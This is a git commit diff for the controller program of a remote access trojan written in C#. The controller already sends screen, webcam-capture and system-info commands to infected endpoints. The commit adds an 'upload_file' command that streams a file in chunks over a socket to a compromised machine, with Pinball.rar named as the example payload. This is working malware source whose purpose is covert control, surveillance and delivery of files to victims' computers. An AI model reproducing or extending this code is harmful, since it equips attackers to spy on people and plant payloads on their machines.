fa2b3cf550ec5564391eebba498d9b3def6f27fc
Zaine Wilson <zgwwilson@gmail.com>
2018-05-07 19:58:22 -0400

    Added file infiltration
    Pinball.rar as example

--- RATCommandControl/RATMain.cs
+++ RATCommandControl/RATMain.cs
@@ -83,6 +83,7 @@ namespace RATCommandControl
             commandIndex.Add("sysinfo");
             commandIndex.Add("screen");
             commandIndex.Add("webcam_capture");
+            commandIndex.Add("upload_file");
             EndPoint selectedEndpoint = null;
             String commandString = null;
             String currentEndpointString = "no endpoint selected!";
@@ -173,6 +174,26 @@ namespace RATCommandControl
                     {
                         captureWebcam(selectedEndpoint);
                     }
+                }else if (commandString.StartsWith("upload_file"))
+                {
+                    if (selectedEndpoint == null)
+                    {
+                        Console.WriteLine("Error: No endpoint selected");
+                    }
+                    else
+                    {
+                        String[] args = commandString.Split(' ');
+                        try
+                        {
+                            String file = args[1];
+                            uploadFile(file, selectedEndpoint);
+                        }catch(Exception e)
+                        {
+                            Console.WriteLine("Error occurred in processing of command, format is upload_file <file>");
+                        }
+                    }
+                    
+                    
                 }
 
 
@@ -189,6 +210,102 @@ namespace RATCommandControl
             Environment.Exit(0xbeef);
             
             
+        }
+        static void uploadFile(String file, EndPoint e)
+        {
+            Console.WriteLine("Processing File...");
+            byte[] confBytes = new byte[1];
+            //Begin socket handling
+
+
+            int endpointIndex = connectedEndPoints.IndexOf(e);
+            Socket usingSock = associatedHandlers.ElementAt(endpointIndex);
+            String query = "upl04d";
+            query += (char)4;
+            byte[] queryBytes = Encoding.ASCII.GetBytes(query);
+            usingSock.Send(queryBytes);
+            usingSock.Receive(confBytes);
+
+
+            //End socket handling
+
+            //begin file read to byte list
+            List<byte> fileBytes = new List<byte>();
+            FileStream f = File.Open(file, FileMode.Open);
+            while(f.Length != f.Position)
+            {
+                fileBytes.Add((byte)f.ReadByte());
+            }
+            f.Close();
+            byte[] terminator = Encoding.ASCII.GetBytes("♦♦endOfFile♦♦");
+            foreach(byte b in terminator)
+            {
+                fileBytes.Add(b);
+            }
+            //end file read to byte list
+
+            //pass client file length
+            byte[] lengthString = Encoding.ASCII.GetBytes(fileBytes.ToArray().LongLength.ToString()); //set the bytes tp length long value as a string
+            usingSock.Send(lengthString); //Send that
+            usingSock.Receive(confBytes);//wait for a confirmation
+            //end pass client file length
+
+            //pass client file name
+            byte[] nameBytes = Encoding.ASCII.GetBytes(file); //set the bytes tp length long value as a string
+            usingSock.Send(nameBytes); //Send that
+            usingSock.Receive(confBytes);//wait for a confirmation
+            //end pass client file name
+
+            //send client file bytes
+            byte[] fileChunk = new byte[1024]; //prepare a 1kb buffer to store blocks of the file
+            byte[] fileByteArray = fileBytes.ToArray(); //ALL the file bytes
+            int iterator = 0; //An iterator for the while loop
+            bool breakFlag = false; //A flag to break out of the for loop
+            Console.WriteLine("Sending file...");
+            Console.Write("|");
+            int spaceCount =((int)fileBytes.ToArray().LongLength / 1024)/10;
+            for(int i = 0; i < spaceCount; i++)
+            {
+                Console.Write(" ");
+            }
+            Console.WriteLine("|");
+            while (true)
+            {
+                if (iterator% 10 == 0)
+                    {
+                        Console.Write("|");
+                    }
+                
+                for(int i = 0; i < 1024; i++)//Fill up a file chunk
+                {
+                    try
+                    {
+                        fileChunk[i] = fileByteArray[iterator * 1024 + i];//Fill in a file chunk with data
+                    }catch//if this trips, we read a have a null access exception which means we're at the end of fileByteArray
+                    {
+                        breakFlag = true;//set the flag to break out of the outer while loop
+                        byte[] runtFileChunk = new byte[i];//define a shorter bytearray to hold the ending
+                        for(int j = 0; j < i; j++)
+                        {
+                            runtFileChunk[j] = fileChunk[j];//populate it
+                        }
+                        usingSock.Send(runtFileChunk);//send it
+                        usingSock.Receive(confBytes);
+                        break; //break out of for loop
+                    }
+                    
+                }
+                if (breakFlag)
+                {
+                    break;
+                }
+                usingSock.Send(fileChunk); //send the full 1024 byte file chunk
+                usingSock.Receive(confBytes);
+                iterator++; //Don't forget this you fuckin toolbag
+            }
+            usingSock.Receive(confBytes);
+            Console.WriteLine("");
+
         }
         static void captureWebcam(EndPoint e)
         {
